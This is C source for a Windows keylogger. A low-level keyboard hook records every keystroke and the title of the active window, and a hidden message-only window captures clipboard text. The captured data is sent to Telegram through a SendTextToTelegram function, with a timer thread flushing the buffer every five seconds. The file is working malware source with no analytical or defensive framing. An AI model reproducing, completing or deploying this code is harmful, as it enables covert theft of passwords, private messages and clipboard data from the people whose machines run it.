#include "../include/keylogger.h"
#include "../include/telegram.h"

HHOOK g_keyboardHook = NULL;
HWND g_hiddenWnd = NULL;
static char sentenceBuffer[8192] = {0};
static int sentenceLen = 0;
static CRITICAL_SECTION g_cs;
static HWND g_lastWindow = NULL;
static INIT_ONCE g_csInitOnce = INIT_ONCE_STATIC_INIT;

static BOOL CALLBACK InitCsCallback(PINIT_ONCE InitOnce, PVOID Parameter, PVOID *Context) {
    InitializeCriticalSection(&g_cs);
    return TRUE;
}

static void EnsureCS() {
    InitOnceExecuteOnce(&g_csInitOnce, InitCsCallback, NULL, NULL);
}

void FlushSentence() {
    EnsureCS();
    char entry[8192] = {0};

    EnterCriticalSection(&g_cs);
    if (sentenceLen > 0) {
        sentenceBuffer[sentenceLen] = '\0';
        SYSTEMTIME st;
        GetSystemTime(&st);
        sprintf_s(entry, sizeof(entry), "[%02d:%02d:%02d] %s", st.wHour, st.wMinute, st.wSecond, sentenceBuffer);
        sentenceLen = 0;
        sentenceBuffer[0] = '\0';
    }
    LeaveCriticalSection(&g_cs);

    if (entry[0] != '\0') {
        SendTextToTelegram(entry);
    }
}

void AddChar(char c) {
    EnsureCS();
    EnterCriticalSection(&g_cs);
    if (sentenceLen < sizeof(sentenceBuffer) - 2) sentenceBuffer[sentenceLen++] = c;
    else { FlushSentence(); sentenceBuffer[0] = c; sentenceLen = 1; }
    LeaveCriticalSection(&g_cs);
}

void AddSpecialKey(const char* keyName) {
    EnsureCS();
    EnterCriticalSection(&g_cs);
    char entry[64];
    sprintf_s(entry, sizeof(entry), "[%s]", keyName);
    for (int i = 0; entry[i] && sentenceLen < sizeof(sentenceBuffer) - 2; i++) sentenceBuffer[sentenceLen++] = entry[i];
    LeaveCriticalSection(&g_cs);
}

DWORD WINAPI TimerThread(LPVOID lpParam) {
    while (g_running) { Sleep(5000); if (g_running) FlushSentence(); }
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        HWND currentWindow = GetForegroundWindow();
        if (currentWindow != g_lastWindow) {
            FlushSentence();
            g_lastWindow = currentWindow;
            char windowTitle[256] = {0};
            GetWindowTextA(currentWindow, windowTitle, sizeof(windowTitle));
            if (strlen(windowTitle) > 0) {
                char entry[512];
                SYSTEMTIME st;
                GetSystemTime(&st);
                sprintf_s(entry, sizeof(entry), "[%02d:%02d:%02d] [WINDOW] %s", st.wHour, st.wMinute, st.wSecond, windowTitle);
                SendTextToTelegram(entry);
            }
        }
        BYTE keyState[256] = {0};
        GetKeyboardState(keyState);
        keyState[VK_SHIFT] = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 0x80 : 0;
        keyState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) ? 0x01 : 0;
        WCHAR wc[4] = {0};
        int ret = ToUnicode(p->vkCode, p->scanCode, keyState, wc, 4, 0);
        if (ret > 0) {
            char utf8[8] = {0};
            WideCharToMultiByte(CP_UTF8, 0, wc, ret, utf8, sizeof(utf8), NULL, NULL);
            char ch = utf8[0];
            if (ch >= 32) AddChar(ch);
        } else {
            switch (p->vkCode) {
                case VK_RETURN: AddChar('\n'); FlushSentence(); break;
                case VK_BACK: EnsureCS(); EnterCriticalSection(&g_cs); if (sentenceLen > 0) sentenceLen--; LeaveCriticalSection(&g_cs); break;
                case VK_TAB: AddChar('\t'); break;
                case VK_ESCAPE: AddSpecialKey("ESC"); break;
                case VK_CONTROL:
                    if (GetAsyncKeyState('C') & 0x8000) { AddSpecialKey("CTRL+C"); FlushSentence(); }
                    else if (GetAsyncKeyState('V') & 0x8000) { AddSpecialKey("CTRL+V"); FlushSentence(); }
                    else AddSpecialKey("CTRL");
                    break;
                case VK_MENU: AddSpecialKey("ALT"); break;
                case VK_SHIFT: AddSpecialKey("SHIFT"); break;
                case VK_CAPITAL: AddSpecialKey("CAPSLOCK"); break;
                case VK_DELETE: AddSpecialKey("DELETE"); break;
                case VK_INSERT: AddSpecialKey("INSERT"); break;
                case VK_HOME: AddSpecialKey("HOME"); break;
                case VK_END: AddSpecialKey("END"); break;
                case VK_PRIOR: AddSpecialKey("PAGEUP"); break;
                case VK_NEXT: AddSpecialKey("PAGEDOWN"); break;
                case VK_UP: AddSpecialKey("UP"); break;
                case VK_DOWN: AddSpecialKey("DOWN"); break;
                case VK_LEFT: AddSpecialKey("LEFT"); break;
                case VK_RIGHT: AddSpecialKey("RIGHT"); break;
                case VK_F1: case VK_F2: case VK_F3: case VK_F4:
                case VK_F5: case VK_F6: case VK_F7: case VK_F8:
                case VK_F9: case VK_F10: case VK_F11: case VK_F12: {
                    char buf[8]; sprintf_s(buf, sizeof(buf), "F%d", p->vkCode - VK_F1 + 1); AddSpecialKey(buf); break;
                }
                default: { char buf[16]; sprintf_s(buf, sizeof(buf), "0x%02X", p->vkCode); AddSpecialKey(buf); break; }
            }
        }
    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND nextViewer = NULL;
    switch (msg) {
        case WM_CREATE: nextViewer = SetClipboardViewer(hwnd); break;
        case WM_DRAWCLIPBOARD: {
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t* pText = (wchar_t*)GlobalLock(hData);
                    if (pText) {
                        int len = WideCharToMultiByte(CP_UTF8, 0, pText, -1, NULL, 0, NULL, NULL);
                        if (len > 0) {
                            char* utf8 = (char*)malloc(len);
                            if (utf8) {
                                WideCharToMultiByte(CP_UTF8, 0, pText, -1, utf8, len, NULL, NULL);
                                char entry[4096];
                                SYSTEMTIME st;
                                GetSystemTime(&st);
                                sprintf_s(entry, sizeof(entry), "[%02d:%02d:%02d] CLIPBOARD: %s", st.wHour, st.wMinute, st.wSecond, utf8);
                                SendTextToTelegram(entry);
                                free(utf8);
                            }
                        }
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
            if (nextViewer) SendMessage(nextViewer, msg, wParam, lParam);
            break;
        }
        case WM_CHANGECBCHAIN:
            if ((HWND)wParam == nextViewer) nextViewer = (HWND)lParam;
            else if (nextViewer) SendMessage(nextViewer, msg, wParam, lParam);
            break;
        case WM_DESTROY:
            ChangeClipboardChain(hwnd, nextViewer);
            PostQuitMessage(0);
            break;
        default: return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI ClipboardThread(LPVOID lpParam) {
    WNDCLASS wc = {0};
    wc.lpfnWndProc = ClipboardWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "MsgWindow";
    if (!RegisterClass(&wc)) return 1;
    g_hiddenWnd = CreateWindowEx(0, "MsgWindow", "MsgWindow", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
    if (!g_hiddenWnd) return 1;
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
